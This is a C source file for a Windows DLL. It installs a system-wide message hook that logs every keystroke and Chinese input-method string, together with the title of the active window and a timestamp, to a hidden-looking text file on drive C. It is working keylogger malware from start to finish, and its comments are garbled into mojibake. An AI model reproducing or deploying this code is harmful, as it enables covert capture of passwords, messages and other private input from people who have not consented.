#include "shurufa.h"  
#include<time.h>
#define FILE_PATH "c:\\EnableCH.txt"  
#define MAX_CODE_COUND 102453

HHOOK        g_hHook = NULL;        //hook���  
HINSTANCE  g_hHinstance = NULL;        //������  
HWND         LastFocusWnd = 0;//��һ�ξ��,����ʹȫ�ֵ�  
HWND         FocusWnd;         //��ǰ���ھ��������ʹȫ�ֵ�  


LPSTR pszMultiByte = NULL;//IME����ַ���ָ��,LPSTR���������һ��ָ����NULL(��\0��)��β��32λANSI�ַ�����ָ��

char title[256];              //��ô�������   
char *ftemp;                //begin/end д���ļ�����  
char temptitle[256] = "<<���⣺";  //<<���⣺��������>>  
char t[2] = { 0, 0 };              //���񵥸���ĸ  
unsigned char buffer[MAX_CODE_COUND];
int _time = 0;

void deletecode(){
	FILE* f1;
	f1 = fopen(FILE_PATH, "ab+");
	u_char s = 0;
	int len = 0;
	len = fread(buffer, 1, MAX_CODE_COUND, f1);

	if (len == 0)
		return;
	fclose(f1);

	f1 = fopen(FILE_PATH, "wb+");
	if ((unsigned char)buffer[len - 1] < (unsigned char)0x80){
		buffer[len - 1] = '\0';
		len--;
	}
	else{
		buffer[len - 1] = '\0';
		buffer[len - 2] = '\0';
		len -= 2;
	}
	if (len <= 0)
		return;
	fwrite(buffer, 1, len, f1);
	fclose(f1);

}


void writefile(char *lpstr)
{//����Ϊ�ļ�  
	FILE* f1;
	f1 = fopen(FILE_PATH, "a+");
	fwrite(lpstr, 1, strlen(lpstr), f1);
	fclose(f1);
}

void writefilech(char ch)
{//����Ϊ�ļ�  
	FILE* ff;
	ff = fopen(FILE_PATH, "a+");
	fprintf(ff, "%c", ch);
	fclose(ff);//Ϊ��֮��
}



void chinesechange(char *s)
{
	int iSize;	//IME����ַ����Ĵ�С	���뷨�༭��
	//LPSTR pszMultiByte = NULL;//IME����ַ���ָ��,LPSTR���������һ��ָ����NULL(��\0��)��β��32λANSI�ַ�����ָ��
	int Chinese = 936;//���ֽ�ת��ʱ���ĵı���	
	iSize = WideCharToMultiByte(Chinese, 0, (LPCWCH)s, -1, NULL, 0, NULL, NULL);//���㽫IME����ַ���ת��ΪASCII��׼�ֽں�Ĵ�С
	//Ϊת������ռ�
	if (pszMultiByte)
	{
		delete[] pszMultiByte;
		pszMultiByte = NULL;
	}
	pszMultiByte = new char[iSize + 1];
	WideCharToMultiByte(Chinese, 0, (LPCWCH)s, -1, pszMultiByte, iSize, NULL, NULL);//���ֽ�ת��
	pszMultiByte[iSize] = '\0';

}



void writetitle()
{
	FocusWnd = GetActiveWindow();

	if (LastFocusWnd != FocusWnd)//���������ں�֮ǰ�Ĵ��ڲ���һ���Ļ���������Ҫ��¼�´������ƺ�ʱ��
	{
		ftemp = "\r\n-------------------------Begin-------------------------\r\nTitle: ";
		writefile(ftemp);
		GetWindowText(FocusWnd, (LPWSTR)title, 256);  //��ǰ���ڱ���
		LastFocusWnd = FocusWnd;
		strcat(temptitle, title);
		strcat(temptitle, ">>\n");
	
		//����ת��
		chinesechange(title);
		writefile(pszMultiByte);

		//---------------------------��ȡ��ʱ��ϵͳʱ��-----------------------------//
		char tm[280] = "";
		char* end = "\r\n";
		struct tm *local;
		time_t TimeNow;
		TimeNow = time(NULL);
		local = localtime(&TimeNow);

		strcat(tm, "     Time: ");
		strcat(tm, asctime(local));
		writefile(tm);
		//---------------------------------��ȡʱ�����------------------------------//

		ftemp = "-------------------------End---------------------------\r\n";
		writefile(ftemp);

	}
}

LRESULT CALLBACK MessageProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PMSG pmsg = (PMSG)lParam;
	if (nCode == HC_ACTION)
	{
		switch (pmsg->message)
		{
			
		case WM_IME_COMPOSITION://�û��ı��˱���״̬
		{
								   writetitle();//��¼���ڵı���͵�ʱ��ʱ��

								   HIMC hIMC;
								   HWND hWnd = pmsg->hwnd;
								   DWORD dwSize;
								   char lpstr[30] = {};
								   if (pmsg->lParam & GCS_RESULTSTR)//����enter��
								   {
									   //�Ȼ�ȡ��ǰ��������Ĵ��ڵ����뷨���  
									   hIMC = ImmGetContext(hWnd);
									   // �Ƚ�ImmGetCompositionString�Ļ�ȡ������Ϊ0����ȡ�ַ�����С.  
									   dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
									   // ��������СҪ�����ַ�����NULL��������С�����ǵ�UNICODE  
									   dwSize += sizeof(WCHAR);
									   memset(lpstr, 0, 30);
									   // �ٵ���һ��.ImmGetCompositionString��ȡ�ַ���  
									   ImmGetCompositionString(hIMC, GCS_RESULTSTR, lpstr, dwSize);

									   //����ת��
									   chinesechange(lpstr);
									   writefile(pszMultiByte);//Ϊ�ӵģ�������ط�����û���޸������Ķ�����ֻ�Ǽ����ַ���ת��

									   ImmReleaseContext(hWnd, hIMC);

								   }
								   break;
		}
		
		case WM_CHAR:  //�ػ��򽹵㴰�ڵļ�����Ϣ--�����ģ����Բ��������뷨ֱ�ӷ��͵�
		{
						   writetitle();//��¼���ڵı���͵�ʱ��ʱ��
						  if (clock() - _time <= 20){
							   break;
						   }//��Ϊword�ڴ����ʱ������ϵͳ������������Ϣ��һ���Ǵ�д��Ӣ����ĸ��һ����Сд��Ӣ����ĸ����ô���������ʱ�����п��ܳ����ص�
						   _time = clock();
						   char str[10];
						   WCHAR ch;
						   ch = (WCHAR)(pmsg->wParam);
						   if (ch >= 32 && ch <= 126)           //�ɼ��ַ�  
						   {
							   writefilech(ch);
						   }
						   if (ch >= 8 && ch <= 31)           //�����ַ�  
						   {
							   switch (ch)
							   {
							   case 8:
								   deletecode();//�˸��
								   break;
							   case 9:
								   writefile("    ");//TAB
								   strcpy(str, "n");
								   break;
							   case 13:
								   writefile("\r\n");//���з�
								   strcpy(str, "n");
								   break;
							   default:strcpy(str, "n");
							   }
						   }

		}

			break;
		}
	}
	LRESULT lResult = CallNextHookEx(g_hHook, nCode, wParam, lParam);

	return(lResult);
}

//HOOK_API BOOL InstallHook()  
BOOL InstallHook()
{
	//WH_GETMESSAGE--��ȡ���������Ϣ
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)MessageProc, g_hHinstance, 0);
	return TRUE;
}

//HOOK_API BOOL UnHook()  
BOOL UnHook()
{
	return UnhookWindowsHookEx(g_hHook);
}

BOOL APIENTRY DllMain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hHinstance = HINSTANCE(hModule);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		UnHook();
		break;
	}
	return TRUE;
}

